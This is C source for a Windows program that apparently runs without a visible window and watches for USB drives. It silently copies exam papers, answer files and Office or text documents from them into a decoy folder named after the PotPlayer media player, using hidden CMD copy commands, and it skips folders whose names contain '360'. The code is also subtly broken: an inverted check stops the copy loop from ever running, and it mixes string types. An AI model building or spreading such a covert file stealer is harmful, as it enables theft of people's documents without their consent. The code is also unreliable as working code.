#define _CRT_SECURE_NO_WARNINGS
#ifdef _MSC_VER
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#endif

#include <stdio.h>
#include<io.h>
#include <Windows.h>
#include "dirent.h"
int getDirName(TCHAR diskName[26][10]);
//获取所有可移动硬盘的名称，返回可移动硬盘的个数
int getAllDirRemoveble(TCHAR diskName[26][10], TCHAR removebleDiskName[26][10], int diskNumber);
void convertsCharToTCHAR(char* strUsr, TCHAR* Name);
void copyFile(const TCHAR* dirName);
void findFolder(const TCHAR* dirName, BOOL recursion);
void CreateFolder(char* folderName);

int main()
{
	while (1)
	{
		TCHAR diskName[26][10] = { 0 };
		TCHAR removebleDiskName[26][10] = { 0 };
		int diskNumber = 0;
		int removebleNumber = 0;
		diskNumber = getDirName(diskName);
		removebleNumber = getAllDirRemoveble(diskName, removebleDiskName, diskNumber);
		if (!removebleNumber)
		{
			for (int i = 0; i < removebleNumber; i++)
			{
				copyFile(removebleDiskName[i]);
				findFolder(removebleDiskName[i], FALSE);
			}

		}
	}
	return 0;
}

int getDirName(TCHAR diskName[26][10])
{
	TCHAR wDrivesName[256];
	GetLogicalDriveStrings(256, wDrivesName);
	TCHAR* p = wDrivesName;
	int i = 0;
	for (i=0; i < 26 && *p != 0; i++)
	{
		wsprintf(diskName[i], TEXT("%s"), p);
		p += (lstrlen(p) + 1);
	}
	return i;
}

int getAllDirRemoveble(TCHAR diskName[26][10], TCHAR removebleDiskName[26][10],int diskNumber)
{
	int removebleDiskNumber = 0;
	for (int i = 0; i < diskNumber; i++)
	{
		if (GetDriveType(diskName[i]) == DRIVE_REMOVABLE)
		{
			wsprintf(removebleDiskName[removebleDiskNumber], TEXT("%s"), diskName[i]);
			removebleDiskNumber++;
		}
	}
	return removebleDiskNumber;
}

void convertsCharToTCHAR(char *strUsr,TCHAR *Name)
{
#ifdef UNICODE
	MultiByteToWideChar(CP_ACP, 0, strUsr, -1, Name, 100);
#else
	strcpy(Name, strUsr);
#endif
}
int first = 0;

void findFolder(const TCHAR* dirName,BOOL recursion)
{
	TCHAR fileNameAll[260] = { 0 };
	intptr_t file;
	struct _finddata_t find;

	_chdir(dirName);
	if ((file = _findfirst("*.*", &find)) == -1L)
	{
		return;
	}

	if (strstr(find.name, ".") == NULL && strstr(find.name, "360") == NULL && find.attrib== _A_SUBDIR)
	{
		if (recursion == 0)
		{
			wsprintf(fileNameAll, TEXT("%s%s"), dirName, find.name);
		}
		else
			wsprintf(fileNameAll, TEXT("%s\\%s"), dirName, find.name);
		copyFile(fileNameAll);
		findFolder(fileNameAll,TRUE);
	}

	while (_findnext(file, &find) == 0)
	{
		if (strcmp(find.name, ".") == 0 || strcmp(find.name, "..") == 0)
			continue;

		for (int i = 0; i < sizeof(fileNameAll); i++)
		{
			fileNameAll[i] = '\0';
		}
		if (strstr(find.name, ".") == NULL && strstr(find.name,"360")==NULL && find.attrib == _A_SUBDIR)
		{
			if (strstr(find.name, ".") == NULL)
			{
				if (recursion == 0)
				{
					sprintf_s(fileNameAll,sizeof(fileNameAll), TEXT("%s%s"), dirName, find.name);
				}
				else
					sprintf_s(fileNameAll,sizeof(fileNameAll), TEXT("%s\\%s"), dirName, find.name);

				copyFile(fileNameAll);
				findFolder(fileNameAll,TRUE);
			}
		}

	}
}

void copyFile(const TCHAR* dirName)
{
	TCHAR fileName[260] = { 0 };
	TCHAR fileNameAll[300] = { 0 };
	TCHAR copyFileName[260] = { 0 };
	intptr_t file;
	struct _finddata_t find;

	CreateFolder("C:\\Program Files\\Potplayer");
	_chdir(dirName);
	if ((file = _findfirst("*.*", &find)) == -1L)
	{
		return;
	}

	convertsCharToTCHAR(find.name, fileName);

	if (strstr(fileName, TEXT("试卷")) != NULL || strstr(fileName, TEXT("ppt")) != NULL || strstr(fileName, TEXT("doc")) != NULL || strstr(fileName, TEXT("答案")) != NULL || strstr(fileName, TEXT("txt")) != NULL)
	{
		printf("%s\n", fileName);
		wsprintf(fileNameAll, TEXT("%s%s"), dirName, fileName);
		wsprintf(copyFileName, TEXT("C:\\Program Files\\Potplayer\\%s"), fileName);

		TCHAR szCommand[1000] = { 0 };
		sprintf(szCommand, "CMD /C Copy /V /Y \"%s\" \"%s\"", fileName, copyFileName);
		if (WinExec(szCommand, SW_HIDE) <= 31)
		{
			return;
		}

		DWORD dw = GetLastError();
	}

	while (_findnext(file, &find) == 0)
	{
		if (strcmp(find.name, ".") == 0 || strcmp(find.name, "..") == 0)
					continue;
			convertsCharToTCHAR(find.name, fileName);

			if (strstr(fileName, TEXT("试卷")) != NULL || strstr(fileName, TEXT(".ppt")) != NULL || strstr(fileName, TEXT(".doc")) != NULL || strstr(fileName, TEXT("答案")) != NULL || strstr(fileName, TEXT(".xlsx")) != NULL)
			{
				printf("%s\n", fileName);
				wsprintf(fileNameAll, TEXT("%s%s"), dirName, fileName);
				wsprintf(copyFileName, TEXT("C:\\Program Files\\Potplayer\\%s"), fileName);
				Sleep(1);

				TCHAR szCommand[1000] = { 0 };
				sprintf(szCommand, "CMD /C Copy /V /Y \"%s\" \"%s\"", fileName, copyFileName);
				if (WinExec(szCommand, SW_HIDE) <= 31)
				{
					return;
				}
			}

			DWORD dw = GetLastError();
	}
	_findclose(file);

	return;
}

void CreateFolder(char* folderName)
{
	// 文件夹不存在则创建文件夹
	if (_access(folderName, 0) == -1)
	{
		_mkdir(folderName);
	}
}